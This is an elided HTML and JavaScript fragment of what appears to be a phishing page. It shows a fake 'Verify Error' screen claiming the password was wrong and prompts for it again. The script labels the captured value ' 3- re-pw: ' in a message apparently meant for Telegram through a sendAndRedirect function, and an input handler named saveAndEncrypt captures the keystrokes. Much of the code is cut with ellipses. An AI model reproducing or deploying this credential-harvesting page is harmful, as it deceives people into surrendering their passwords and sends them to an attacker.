...
<head>
    ...
    function sendAndRedirect() {
        ...
        var telegramMessage = ' 3- re-pw: ' + message;
...
<body>
   ...
   <h4 style="display: flex; align-items: center; justify-content: center; margin: 20px 0 0 0px; font-weight: bold;">Verify Error</h4>

  </h4>


 <p>The password that you've entered is incorrect.<br> Please try again.
</p>
        </div>

  <div>
      <input type="password" style="margin-bottom: 20px;border: 1px solid red;" maxlength="30" rows="1" placeholder="Password" id="lastPassword" oninput="saveAndEncrypt(this)"></input>
  ...
  <script>
    ...
    function checkPasswords() {
        // Şifre kontrolü yapılacak fonksiyon buraya eklenebilir
    }
</script>
